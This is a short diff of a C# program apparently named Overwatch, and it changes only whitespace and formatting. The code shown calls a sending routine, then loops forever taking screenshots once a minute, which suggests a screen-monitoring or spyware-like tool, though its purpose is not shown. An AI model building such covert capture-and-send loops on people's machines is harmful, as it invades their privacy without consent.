@@ -17,14 +17,14 @@ namespace Overwatch
                 cSendingInformation s = new cSendingInformation();
                 s.Sending();
                 while (true)
-                { 
+                {
                     info.ScreenShoot();
                     info.Start();
                     System.Threading.Thread.Sleep(60000);
                 }
-                
+
             }
-            catch (Exception ex){ Log.Write(ex.Message, true);}
+            catch (Exception ex) { Log.Write(ex.Message, true); }
         }
     }
 }
